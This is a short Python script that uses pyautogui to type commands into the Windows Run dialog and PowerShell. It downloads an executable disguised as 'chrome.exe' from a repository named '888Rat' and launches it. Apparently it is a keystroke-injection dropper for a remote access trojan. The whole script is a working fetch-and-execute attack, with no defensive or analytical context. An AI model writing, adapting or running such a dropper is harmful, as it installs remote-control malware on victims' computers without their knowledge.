import pyautogui
import time
time.sleep(1.0)
pyautogui.hotkey('win','r')
time.sleep(0.2)
# Download
pyautogui.typewrite("powershell Start-Process powershell", interval=0.02)
pyautogui.hotkey('enter')
time.sleep(3.0)
pyautogui.typewrite("wget 'https://github.com/rikeshdahal/888Rat/raw/main/chrome.exe' -outfile 'c:\\temp\\Rikesh.exe'", interval=0.02)
pyautogui.hotkey('enter')
pyautogui.typewrite(" Exit;", interval=0.02)
pyautogui.hotkey('enter')
# openfile
pyautogui.hotkey('win','r')
time.sleep(0.2)
pyautogui.typewrite("c:\\temp\\Rikesh.exe", interval=0.02)
pyautogui.hotkey('enter')




